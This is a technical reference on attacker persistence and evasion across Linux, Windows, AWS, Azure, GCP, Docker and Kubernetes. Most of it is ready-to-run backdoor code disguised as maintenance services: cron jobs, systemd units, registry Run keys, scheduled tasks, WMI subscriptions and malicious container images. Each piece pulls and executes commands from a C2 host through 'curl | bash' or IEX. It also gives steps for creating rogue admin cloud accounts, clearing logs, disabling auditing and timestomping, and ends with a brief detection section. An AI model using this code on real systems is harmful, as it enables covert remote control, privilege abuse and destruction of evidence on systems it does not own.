# Persistence: Advanced Techniques and Evasion

## Overview

Persistence techniques allow attackers to maintain access to compromised systems across reboots, credential changes, and other remediation efforts. Modern persistence focuses on cloud environments, containerized applications, and living-off-the-land techniques that blend with normal system operations.

## Linux Persistence Techniques

### Systemd Service Persistence

#### Malicious System Services
```bash
# Create persistent systemd service
sudo tee /etc/systemd/system/system-health-check.service << 'EOF'
[Unit]
Description=System Health Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do sleep 3600; /tmp/.system-check.sh; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Create the payload script
sudo tee /tmp/.system-check.sh << 'EOF'
#!/bin/bash
# Legitimate-looking system check
ps aux > /tmp/system.log 2>/dev/null
# Backdoor functionality
if curl -s http://c2-server.com/cmd 2>/dev/null | grep -q "execute"; then
    curl -s http://c2-server.com/cmd | bash
fi
EOF

chmod +x /tmp/.system-check.sh

# Enable and start the service
sudo systemctl daemon-reload
sudo systemctl enable system-health-check.service
sudo systemctl start system-health-check.service

# Verify persistence
sudo systemctl status system-health-check.service
```

#### User-Level Systemd Services
```bash
# Create user service directory
mkdir -p ~/.config/systemd/user

# Create user service
tee ~/.config/systemd/user/user-sync.service << 'EOF'
[Unit]
Description=User Data Synchronization Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=/bin/bash /home/user/.local/bin/sync-daemon.sh
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
EOF

# Create payload script
mkdir -p ~/.local/bin
tee ~/.local/bin/sync-daemon.sh << 'EOF'
#!/bin/bash
while true; do
    sleep 1800  # 30 minutes
    # Check for commands
    if command -v curl &> /dev/null; then
        curl -s http://c2-server.com/user-cmd | bash 2>/dev/null
    fi
done
EOF

chmod +x ~/.local/bin/sync-daemon.sh

# Enable user service
systemctl --user daemon-reload
systemctl --user enable user-sync.service
systemctl --user start user-sync.service

# Enable lingering for user (persistence across logouts)
sudo loginctl enable-linger $USER
```

### Cron Job Persistence

#### System-Wide Cron Jobs
```bash
# Add to system crontab
echo "0 */6 * * * root /bin/bash -c 'curl -s http://c2-server.com/hourly | bash'" | sudo tee -a /etc/crontab

# Create cron.d entry
sudo tee /etc/cron.d/system-updates << 'EOF'
# System update checker
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 */4 * * * root /usr/local/bin/system-update-check.sh >/dev/null 2>&1
EOF

# Create the script
sudo tee /usr/local/bin/system-update-check.sh << 'EOF'
#!/bin/bash
# Legitimate system update check
apt list --upgradable >/dev/null 2>&1
# Backdoor
curl -s http://c2-server.com/system-cmd | bash >/dev/null 2>&1
EOF

sudo chmod +x /usr/local/bin/system-update-check.sh
```

#### User Cron Jobs
```bash
# Add user cron job
(crontab -l 2>/dev/null; echo "*/15 * * * * /home/user/.local/bin/user-maintenance.sh") | crontab -

# Create maintenance script
mkdir -p ~/.local/bin
tee ~/.local/bin/user-maintenance.sh << 'EOF'
#!/bin/bash
# Clean temp files (legitimate cover)
find /tmp -name "*.tmp" -mtime +1 -delete 2>/dev/null
# Backdoor
curl -s http://c2-server.com/user-tasks | bash 2>/dev/null
EOF

chmod +x ~/.local/bin/user-maintenance.sh
```

### Shell Profile Persistence

#### Bashrc Persistence
```bash
# Add to user's bashrc
echo 'export PATH=$PATH:~/.local/bin' >> ~/.bashrc
echo '[ -f ~/.local/bin/.system-helper ] && source ~/.local/bin/.system-helper 2>/dev/null' >> ~/.bashrc

# Create the helper script
mkdir -p ~/.local/bin
tee ~/.local/bin/.system-helper << 'EOF'
#!/bin/bash
# Only run if interactive shell and not already running
if [[ $- == *i* ]] && ! pgrep -f "background-sync" >/dev/null; then
    nohup bash -c 'while true; do
        sleep 3600
        curl -s http://c2-server.com/bg-cmd | bash 2>/dev/null
    done' >/dev/null 2>&1 &
    disown
fi
EOF

chmod +x ~/.local/bin/.system-helper
```

#### Profile.d Persistence
```bash
# System-wide profile script
sudo tee /etc/profile.d/system-optimization.sh << 'EOF'
#!/bin/bash
# System optimization settings
export HISTCONTROL=ignoredups
export HISTSIZE=1000

# Background system monitor
if [[ "$USER" != "root" ]] && ! pgrep -f "sys-monitor" >/dev/null 2>&1; then
    nohup bash -c 'while true; do
        sleep 7200
        curl -s http://c2-server.com/monitor | bash >/dev/null 2>&1
    done' >/dev/null 2>&1 &
fi
EOF

sudo chmod +x /etc/profile.d/system-optimization.sh
```

### SSH Key Persistence

#### Authorized Keys Persistence
```bash
# Generate SSH key pair
ssh-keygen -t ed25519 -f ~/.ssh/persistence_key -N ""

# Add public key to authorized_keys
mkdir -p ~/.ssh
cat ~/.ssh/persistence_key.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Hide the private key
cp ~/.ssh/persistence_key ~/.ssh/.system-key
rm ~/.ssh/persistence_key

# Alternative: Add to root authorized_keys if accessible
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... system-maintenance@localhost" | sudo tee -a /root/.ssh/authorized_keys

# Test persistence
ssh -i ~/.ssh/.system-key user@localhost
```

#### SSH Configuration Persistence
```bash
# Modify SSH client config for automatic connection
tee -a ~/.ssh/config << 'EOF'
Host maintenance-server
    HostName c2-server.com
    User maintenance
    IdentityFile ~/.ssh/.system-key
    ServerAliveInterval 60
    ServerAliveCountMax 3
    ConnectTimeout 10
EOF

# Create connection script
tee ~/.local/bin/system-maintenance << 'EOF'
#!/bin/bash
# Establish maintenance tunnel
while true; do
    ssh -N -R 8080:localhost:22 maintenance-server 2>/dev/null
    sleep 300
done
EOF

chmod +x ~/.local/bin/system-maintenance
```

## Windows Persistence Techniques

### Registry-Based Persistence

#### Run Keys Persistence
```batch
REM Current User Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemOptimizer" /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Local\system-optimizer.exe" /f

REM Local Machine Run key (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityMonitor" /t REG_SZ /d "C:\Windows\System32\security-monitor.exe" /f

REM RunOnce key (executes once then removes itself)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemUpdate" /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Local\update-helper.exe" /f
```

```powershell
# PowerShell version
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\AppData\Local\health-check.ps1" -PropertyType String -Force

# Create the PowerShell payload
$payload = @'
# Windows Security Health Check
while ($true) {
    Start-Sleep -Seconds 3600
    try {
        $command = Invoke-WebRequest -Uri "http://c2-server.com/ps-cmd" -UseBasicParsing -TimeoutSec 10
        if ($command.Content) {
            Invoke-Expression $command.Content
        }
    } catch {}
}
'@

$payload | Out-File -FilePath "$env:LOCALAPPDATA\health-check.ps1" -Force
```

#### Service Registry Persistence
```batch
REM Create a Windows service via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsHealthService" /v "DisplayName" /t REG_SZ /d "Windows Health Monitoring Service" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsHealthService" /v "Description" /t REG_SZ /d "Monitors system health and performance metrics" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsHealthService" /v "ImagePath" /t REG_SZ /d "C:\Windows\System32\svchost.exe -k netsvcs -p -s WindowsHealthService" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsHealthService" /v "Start" /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsHealthService" /v "Type" /t REG_DWORD /d 32 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsHealthService\Parameters" /v "ServiceDll" /t REG_SZ /d "C:\Windows\System32\health-service.dll" /f
```

### Scheduled Task Persistence

#### Windows Task Scheduler
```batch
REM Create scheduled task using schtasks
schtasks /create /tn "SystemMaintenanceTask" /tr "powershell.exe -WindowStyle Hidden -File C:\Windows\Tasks\maintenance.ps1" /sc daily /st 09:00 /ru SYSTEM

REM Create task that runs every 30 minutes
schtasks /create /tn "SecurityHealthCheck" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://c2-server.com/health')\"" /sc minute /mo 30

REM Create task that runs at logon
schtasks /create /tn "UserEnvironmentSetup" /tr "C:\Users\%USERNAME%\AppData\Local\env-setup.exe" /sc onlogon /rl highest
```

```powershell
# PowerShell version using Register-ScheduledTask
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Tasks\system-monitor.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "SystemPerformanceMonitor" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Monitors system performance and health metrics"

# Create the monitoring script
$monitorScript = @'
# System Performance Monitor
while ($true) {
    Start-Sleep -Seconds 1800  # 30 minutes
    try {
        # Legitimate system monitoring
        Get-Process | Out-File -FilePath "C:\Windows\Temp\processes.log" -Append

        # Backdoor functionality
        $response = Invoke-WebRequest -Uri "http://c2-server.com/monitor-cmd" -UseBasicParsing -TimeoutSec 5
        if ($response.Content) {
            Invoke-Expression $response.Content
        }
    } catch {}
}
'@

$monitorScript | Out-File -FilePath "C:\Windows\Tasks\system-monitor.ps1" -Force
```

### Service Persistence

#### Windows Service Creation
```batch
REM Create service using sc command
sc create "WindowsUpdateAssistant" binPath= "C:\Windows\System32\update-assistant.exe" DisplayName= "Windows Update Assistant" description= "Assists with Windows Update operations" start= auto

REM Start the service
sc start "WindowsUpdateAssistant"

REM Alternative: Create service that runs under svchost
sc create "BackgroundTaskHost" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" DisplayName= "Background Task Host Service" description= "Manages background system tasks" start= auto
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\netsvcs" /v "BackgroundTaskHost" /t REG_SZ /d "" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BackgroundTaskHost\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\Windows\System32\background-tasks.dll" /f
```

```powershell
# PowerShell service creation
New-Service -Name "SystemOptimizationService" -BinaryPathName "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\optimization-service.ps1" -DisplayName "System Optimization Service" -Description "Optimizes system performance and resource usage" -StartupType Automatic

# Create service script
$serviceScript = @'
# System Optimization Service
Add-Type -TypeDefinition @"
    using System;
    using System.ServiceProcess;
    using System.Threading;
    using System.Net;

    public class OptimizationService : ServiceBase {
        private Timer timer;

        protected override void OnStart(string[] args) {
            timer = new Timer(CheckForTasks, null, TimeSpan.Zero, TimeSpan.FromMinutes(15));
        }

        protected override void OnStop() {
            timer?.Dispose();
        }

        private void CheckForTasks(object state) {
            try {
                using (WebClient client = new WebClient()) {
                    string response = client.DownloadString("http://c2-server.com/service-cmd");
                    if (!string.IsNullOrEmpty(response)) {
                        // Execute command
                    }
                }
            } catch { }
        }
    }
"@

$service = New-Object OptimizationService
$service.ServiceName = "SystemOptimizationService"
[System.ServiceProcess.ServiceBase]::Run($service)
'@

$serviceScript | Out-File -FilePath "C:\Windows\System32\optimization-service.ps1" -Force
```

### DLL Hijacking Persistence

#### DLL Search Order Hijacking
```powershell
# Find DLL hijacking opportunities
Get-ChildItem C:\Windows\System32\*.exe | ForEach-Object {
    $dependencies = & "C:\Windows\System32\dumpbin.exe" /dependents $_.FullName 2>$null
    if ($dependencies -match "KERNEL32.dll|USER32.dll") {
        Write-Host "Potential target: $($_.Name)"
    }
}

# Create malicious DLL (example for legitimate DLL replacement)
$dllCode = @'
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // Legitimate DLL functionality
            LoadLibraryA("C:\\Windows\\System32\\original-dll.dll");

            // Backdoor functionality
            system("powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://c2-server.com/dll-load')\"");
            break;
    }
    return TRUE;
}

// Export original functions
extern "C" __declspec(dllexport) void OriginalFunction() {
    // Call original function from legitimate DLL
}
'@

# Compile and place malicious DLL
# gcc -shared -o malicious.dll dllcode.c
# Move malicious.dll to appropriate location for hijacking
```

## Cloud Platform Persistence

### AWS Persistence Techniques

#### Lambda Function Persistence
```bash
# Create Lambda function for persistence
aws iam create-role --role-name LambdaBackdoorRole --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "Service": "lambda.amazonaws.com" },
      "Action": "sts:AssumeRole"
    }
  ]
}'

# Attach permissions
aws iam attach-role-policy --role-name LambdaBackdoorRole --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole

# Create Lambda function
zip function.zip index.py

aws lambda create-function \
  --function-name SystemMaintenanceFunction \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/LambdaBackdoorRole \
  --handler index.handler \
  --zip-file fileb://function.zip \
  --description "System maintenance and monitoring function"

# Create CloudWatch event to trigger function
aws events put-rule \
  --name SystemMaintenanceSchedule \
  --schedule-expression "rate(30 minutes)" \
  --description "System maintenance schedule"

aws events put-targets \
  --rule SystemMaintenanceSchedule \
  --targets "Id"="1","Arn"="arn:aws:lambda:REGION:ACCOUNT:function:SystemMaintenanceFunction"

aws lambda add-permission \
  --function-name SystemMaintenanceFunction \
  --statement-id maintenance-event \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:REGION:ACCOUNT:rule/SystemMaintenanceSchedule
```

#### IAM Role Persistence
```bash
# Create backdoor IAM user
aws iam create-user --user-name system-backup-service

# Create access keys
aws iam create-access-key --user-name system-backup-service

# Attach admin policy
aws iam attach-user-policy --user-name system-backup-service --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Alternative: Create role with cross-account trust
aws iam create-role --role-name CrossAccountBackdoor --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::ATTACKER-ACCOUNT:root" },
      "Action": "sts:AssumeRole"
    }
  ]
}'

aws iam attach-role-policy --role-name CrossAccountBackdoor --policy-arn arn:aws:iam::aws:policy/PowerUserAccess
```

### Azure Persistence Techniques

#### Azure Automation Account
```bash
# Create automation account runbook
az automation account create --resource-group MyResourceGroup --name BackdoorAutomation --location eastus

# Create runbook
az automation runbook create --resource-group MyResourceGroup --automation-account-name BackdoorAutomation --name SystemMaintenanceRunbook --type PowerShell

# Upload runbook content
cat << 'EOF' > maintenance-runbook.ps1
# System maintenance runbook
param()

try {
    # Legitimate maintenance tasks
    Get-AzVM | Out-String

    # Backdoor functionality
    $response = Invoke-WebRequest -Uri "http://c2-server.com/azure-cmd" -UseBasicParsing
    if ($response.Content) {
        Invoke-Expression $response.Content
    }
} catch {}
EOF

az automation runbook replace-content --resource-group MyResourceGroup --automation-account-name BackdoorAutomation --name SystemMaintenanceRunbook --content @maintenance-runbook.ps1

# Create schedule
az automation schedule create --resource-group MyResourceGroup --automation-account-name BackdoorAutomation --name MaintenanceSchedule --frequency hour --interval 2 --description "System maintenance schedule"

# Link schedule to runbook
az automation job-schedule create --resource-group MyResourceGroup --automation-account-name BackdoorAutomation --runbook-name SystemMaintenanceRunbook --schedule-name MaintenanceSchedule
```

#### Azure AD Application Persistence
```bash
# Create application registration
az ad app create --display-name "System Monitoring Service" --available-to-other-tenants false

# Get application ID
APP_ID=$(az ad app list --display-name "System Monitoring Service" --query "[].appId" -o tsv)

# Create service principal
az ad sp create --id $APP_ID

# Assign permissions
az role assignment create --assignee $APP_ID --role Contributor --scope /subscriptions/SUBSCRIPTION-ID

# Create client secret
az ad app credential reset --id $APP_ID --append --credential-description "Monitoring Service Key"
```

### GCP Persistence Techniques

#### Cloud Functions Persistence
```bash
# Create Cloud Function
gcloud functions deploy system-monitor \
  --runtime python39 \
  --trigger-topic system-maintenance \
  --entry-point monitor \
  --description "System monitoring and maintenance function"

# Create Pub/Sub topic
gcloud pubsub topics create system-maintenance

# Create Cloud Scheduler job
gcloud scheduler jobs create pubsub maintenance-job \
  --schedule="0 */2 * * *" \
  --topic=system-maintenance \
  --message-body='{"action":"monitor"}' \
  --description="System maintenance job"

# Function code (main.py)
cat << 'EOF' > main.py
import requests
import subprocess

def monitor(event, context):
    """System monitoring function"""
    try:
        # Legitimate monitoring
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)

        # Backdoor functionality
        response = requests.get('http://c2-server.com/gcp-cmd', timeout=5)
        if response.text:
            subprocess.run(response.text.split(), shell=True)
    except:
        pass
EOF
```

#### Service Account Persistence
```bash
# Create service account
gcloud iam service-accounts create backup-service \
  --display-name="Backup Service Account" \
  --description="Service account for backup operations"

# Assign roles
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:backup-service@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/editor"

# Create and download key
gcloud iam service-accounts keys create backup-key.json \
  --iam-account=backup-service@PROJECT_ID.iam.gserviceaccount.com
```

## Container Persistence Techniques

### Docker Container Persistence

#### Privileged Container Escape and Persistence
```bash
# Create persistent container with host access
docker run -d --name system-monitor \
  --privileged \
  --restart=always \
  -v /:/host \
  -v /var/run/docker.sock:/var/run/docker.sock \
  alpine:latest \
  sh -c 'while true; do sleep 3600; chroot /host /bin/bash -c "curl -s http://c2-server.com/docker-cmd | bash"; done'

# Alternative: Container with cron persistence
docker run -d --name maintenance-service \
  --restart=unless-stopped \
  -v /etc/cron.d:/host-cron \
  alpine:latest \
  sh -c 'echo "*/30 * * * * root curl -s http://c2-server.com/cron-cmd | bash" > /host-cron/maintenance; while true; do sleep 3600; done'
```

#### Container Image Poisoning
```bash
# Create malicious image
cat << 'EOF' > Dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl cron
COPY backdoor.sh /usr/local/bin/system-check
RUN chmod +x /usr/local/bin/system-check
RUN echo "*/15 * * * * root /usr/local/bin/system-check" >> /etc/crontab
CMD ["cron", "-f"]
EOF

# Backdoor script
cat << 'EOF' > backdoor.sh
#!/bin/bash
# System health check
df -h > /tmp/disk-usage.log
# Backdoor
curl -s http://c2-server.com/container-cmd | bash 2>/dev/null
EOF

# Build and tag as legitimate image
docker build -t company/monitoring:latest .
docker push company/monitoring:latest
```

### Kubernetes Persistence

#### Persistent Pods and Services
```yaml
# Create persistent deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: system-monitoring
  namespace: kube-system
  labels:
    app: system-monitoring
spec:
  replicas: 1
  selector:
    matchLabels:
      app: system-monitoring
  template:
    metadata:
      labels:
        app: system-monitoring
    spec:
      containers:
      - name: monitor
        image: alpine:latest
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 1800; wget -qO- http://c2-server.com/k8s-cmd | sh; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
      hostNetwork: true
      hostPID: true
      tolerations:
      - operator: Exists
        effect: NoSchedule
```

```bash
# Apply persistent resources
kubectl apply -f persistence-deployment.yaml

# Create persistent service account with cluster-admin
kubectl create serviceaccount backdoor-sa -n kube-system
kubectl create clusterrolebinding backdoor-sa-admin --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor-sa

# Get service account token
kubectl get secret $(kubectl get serviceaccount backdoor-sa -n kube-system -o jsonpath='{.secrets[0].name}') -n kube-system -o jsonpath='{.data.token}' | base64 -d
```

#### Kubernetes Admission Controller Backdoor
```yaml
# Malicious ValidatingAdmissionWebhook
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionWebhook
metadata:
  name: security-validator
webhooks:
- name: validate.security.io
  clientConfig:
    service:
      name: security-validation-service
      namespace: kube-system
      path: "/validate"
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1", "v1beta1"]
  sideEffects: None
  failurePolicy: Ignore  # Allow requests even if webhook fails
```

## Living Off The Land Persistence

### Windows LOLBAS Techniques

#### WMI Event Subscription
```powershell
# Create WMI event filter
$filterName = "SystemHealthFilter"
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name=$filterName
    EventNamespace="root\cimv2"
    QueryLanguage="WQL"
    Query=$query
}

# Create WMI event consumer
$consumerName = "SystemHealthConsumer"
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name=$consumerName
    CommandLineTemplate="powershell.exe -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://c2-server.com/wmi-cmd')`""
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$filter
    Consumer=$consumer
}
```

#### BITS Job Persistence
```powershell
# Create persistent BITS job
bitsadmin /create /download SystemUpdateJob
bitsadmin /addfile SystemUpdateJob http://c2-server.com/update.exe C:\Windows\Temp\update.exe
bitsadmin /setnotifycmdline SystemUpdateJob "C:\Windows\Temp\update.exe" ""
bitsadmin /setminretrydelay SystemUpdateJob 3600
bitsadmin /setmaxretrydelay SystemUpdateJob 7200
bitsadmin /resume SystemUpdateJob

# Alternative: PowerShell BITS
Start-BitsTransfer -Source "http://c2-server.com/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Asynchronous -Priority Foreground -RetryInterval 3600
```

#### PowerShell Profile Persistence
```powershell
# Modify PowerShell profile
$profilePath = $PROFILE.AllUsersAllHosts
$profileContent = @'
# System optimization functions
function Optimize-System {
    # Legitimate system optimization
    Get-Process | Where-Object {$_.WorkingSet -gt 100MB} | Stop-Process -Force -ErrorAction SilentlyContinue

    # Backdoor functionality
    try {
        $response = Invoke-WebRequest -Uri "http://c2-server.com/ps-profile" -UseBasicParsing -TimeoutSec 5
        if ($response.Content) {
            Invoke-Expression $response.Content
        }
    } catch {}
}

# Auto-execute on profile load
if (-not (Get-Process -Name "system-optimizer" -ErrorAction SilentlyContinue)) {
    Start-Job -ScriptBlock { Optimize-System }
}
'@

$profileContent | Out-File -FilePath $profilePath -Force
```

### Linux LOLBIN Techniques

#### Shell Configuration Persistence
```bash
# Zsh persistence
echo 'autoload -U +X bashcompinit && bashcompinit' >> ~/.zshrc
echo 'complete -o nospace -C /usr/local/bin/system-completion system' >> ~/.zshrc

# Create the completion script
sudo tee /usr/local/bin/system-completion << 'EOF'
#!/bin/bash
# System completion helper
if [[ "${COMP_LINE}" == "system "* ]]; then
    # Legitimate completion
    echo "status health check update"
else
    # Backdoor trigger
    if [[ "$1" == "BACKGROUND_TASK" ]]; then
        curl -s http://c2-server.com/completion-cmd | bash &
    fi
fi
EOF

sudo chmod +x /usr/local/bin/system-completion

# Trigger backdoor
echo '/usr/local/bin/system-completion BACKGROUND_TASK' >> ~/.zshrc
```

#### Log Rotation Hook
```bash
# Create logrotate configuration
sudo tee /etc/logrotate.d/system-maintenance << 'EOF'
/var/log/system-maintenance.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    postrotate
        /usr/local/bin/maintenance-hook.sh
    endscript
}
EOF

# Create maintenance hook
sudo tee /usr/local/bin/maintenance-hook.sh << 'EOF'
#!/bin/bash
# Log rotation maintenance
find /var/log -name "*.gz" -mtime +30 -delete 2>/dev/null
# Backdoor
curl -s http://c2-server.com/logrotate-cmd | bash 2>/dev/null &
EOF

sudo chmod +x /usr/local/bin/maintenance-hook.sh

# Create log file to trigger rotation
echo "System started: $(date)" | sudo tee /var/log/system-maintenance.log
```

## Anti-Forensics and Evasion

### Log Evasion Techniques

#### Windows Event Log Manipulation
```powershell
# Clear specific event logs
wevtutil cl System
wevtutil cl Application
wevtutil cl Security

# Disable logging temporarily
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Process Tracking" /success:disable /failure:disable

# Modify log size limits
wevtutil sl System /ms:1048576
wevtutil sl Application /ms:1048576
wevtutil sl Security /ms:1048576

# Alternative: PowerShell log clearing
Get-EventLog -LogName System | Clear-EventLog
Get-EventLog -LogName Application | Clear-EventLog
```

#### Linux Log Evasion
```bash
# Clear system logs
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages
> /var/log/secure
> ~/.bash_history

# Disable history logging
export HISTFILE=/dev/null
export HISTSIZE=0
unset HISTFILE
set +o history

# Link logs to /dev/null
ln -sf /dev/null ~/.bash_history
ln -sf /dev/null ~/.zsh_history

# Timestamp manipulation
touch -r /bin/ls backdoor.sh
touch -t 202301010000 persistence.sh
```

### Process Hiding Techniques

#### Windows Process Hiding
```powershell
# Run process with different name
Start-Process -FilePath "backdoor.exe" -ArgumentList "-hidden" -WindowStyle Hidden -PassThru | ForEach-Object { $_.ProcessName = "svchost" }

# Hollow process injection (concept)
$target = Start-Process -FilePath "svchost.exe" -PassThru -WindowStyle Hidden
# Inject payload into suspended svchost process
```

#### Linux Process Hiding
```bash
# Run with different process name
exec -a "systemd-daemon" ./backdoor

# Background process with nohup
nohup ./backdoor > /dev/null 2>&1 &
disown

# Hide from ps with argv manipulation
./backdoor systemd-networkd
```

## Detection and Monitoring

### Persistence Detection Tools

#### Windows Detection
```powershell
# Autoruns equivalent PowerShell
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath, Author

# Service enumeration
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Select-Object Name, DisplayName, Status
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, DisplayName, PathName
```

#### Linux Detection
```bash
# Systemd service enumeration
systemctl list-units --type=service --state=active
systemctl list-unit-files --type=service --state=enabled

# Cron job enumeration
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# Startup script enumeration
ls -la /etc/init.d/
ls -la /etc/systemd/system/
ls -la ~/.config/systemd/user/

# Process monitoring with pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64 -f -i 1000
```

### Network-Based Detection

#### C2 Communication Detection
```bash
# Network connection monitoring
netstat -antup | grep ESTABLISHED
ss -tulpn | grep LISTEN

# DNS monitoring
dig @8.8.8.8 suspicious-domain.com
nslookup suspicious-domain.com

# HTTP traffic analysis
tcpdump -i eth0 -A 'port 80 or port 443' | grep -i "user-agent"
tshark -i eth0 -f "port 80" -T fields -e http.host -e http.request.uri
```

## References and Resources

- [MITRE ATT&CK Persistence](https://attack.mitre.org/tactics/TA0003/)
- [LOLBAS Project](https://lolbas-project.github.io/) - Living Off The Land Binaries and Scripts
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation and persistence
- [SysInternals Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [Linux Persistence Techniques](https://attack.mitre.org/techniques/T1053/)
- [Container Security Best Practices](https://kubernetes.io/docs/concepts/security/)